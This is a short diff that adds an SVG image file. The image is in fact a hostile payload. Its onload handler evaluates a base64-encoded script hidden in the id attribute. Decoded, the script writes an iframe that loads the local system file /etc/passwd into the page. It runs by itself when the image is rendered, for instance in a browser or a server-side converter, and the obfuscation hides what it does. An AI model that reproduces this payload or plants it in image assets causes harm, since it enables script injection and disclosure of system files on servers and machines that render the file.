@@ -1,0 +1,2 @@
+<svg></svg>
+<svg viewBox="0 0 240 80" height="1000" width="1000" onload="eval(atob(this.id))" id="ZG9jdW1lbnQud3JpdGUoJzxzdmctZHVtbXk+PC9zdmctZHVtbXk+PGlmcmFtZSBzcmM9ImZpbGU6Ly8vZXRjL3Bhc3N3ZCIgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwMHB4Ij48L2lmcmFtZT48c3ZnIHZpZXdCb3g9IjAgMCAyNDAgODAiIGhlaWdodD0iMTAwMCIgd2lkdGg9IjEwMDAiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+PHRleHQgeD0iMCIgeT0iMCIgY2xhc3M9IlJycnJyIiBpZD0iZGVtbyI+ZGF0YTwvdGV4dD48L3N2Zz4nKTs="></svg>
